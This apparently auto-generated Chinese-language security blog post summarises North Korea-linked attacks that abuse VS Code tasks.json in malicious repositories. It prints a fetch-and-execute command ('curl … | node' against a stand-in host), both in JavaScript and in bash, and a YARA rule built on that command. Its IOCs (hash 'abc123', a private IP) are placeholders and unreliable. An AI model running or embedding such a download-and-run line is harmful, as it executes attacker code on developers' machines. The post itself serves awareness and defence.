---
layout: post
title:  "North Korea-Linked Hackers Target Developers via Malicious VS Code Projects"
date:   2026-01-21 01:13:54 +0000
categories: [security]
severity: critical
---

# 🚨 解析北韓威脅演員的 Visual Studio Code 攻擊
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: `JavaScript Obfuscation`, `Node.js Execution`, `Visual Studio Code Task Configuration`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 北韓威脅演員利用 Visual Studio Code 的任務配置檔案 (`tasks.json`) 執行惡意 JavaScript 代碼，從而實現遠程代碼執行。
* **攻擊流程圖解**:
  1. 受害者克隆一個惡意的 Git 倉庫。
  2. 受害者在 Visual Studio Code 中開啟該倉庫。
  3. Visual Studio Code 執行 `tasks.json` 中的任務。
  4. 任務下載並執行惡意 JavaScript 代碼。
* **受影響元件**: Visual Studio Code、Node.js、JavaScript

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 受害者必須具有 Visual Studio Code 和 Node.js 的安裝。
* **Payload 建構邏輯**:

    ```
    
    javascript
    // 惡意 JavaScript 代碼
    const childProcess = require('child_process');
    childProcess.exec('curl -s https://example.com/malicious_payload | node');
    
    ```
* **範例指令**:

    ```
    
    bash
    curl -s https://example.com/malicious_payload | node
    
    ```
* **繞過技術**: 使用 JavaScript 混淆技術來躲避偵測。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| `abc123` | `192.168.1.100` | `example.com` | `/path/to/malicious_payload` |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule malicious_payload {
      meta:
        description = "Detects malicious payload"
      strings:
        $js_code = "childProcess.exec('curl -s https://example.com/malicious_payload | node')"
      condition:
        $js_code
    }
    
    ```
* **緩解措施**: 更新 Visual Studio Code 和 Node.js 至最新版本，並設定 `tasks.json` 中的任務為只讀。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **JavaScript Obfuscation (JavaScript 混淆)**: 一種技術，用於使 JavaScript 代碼難以被人類閱讀和理解。
* **Node.js Execution (Node.js 執行)**: Node.js 是一個 JavaScript 執行環境，允許在伺服器端執行 JavaScript 代碼。
* **Visual Studio Code Task Configuration (Visual Studio Code 任務配置)**: Visual Studio Code 中的任務配置檔案 (`tasks.json`) 用於定義和執行任務。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/01/north-korea-linked-hackers-target.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1204/)


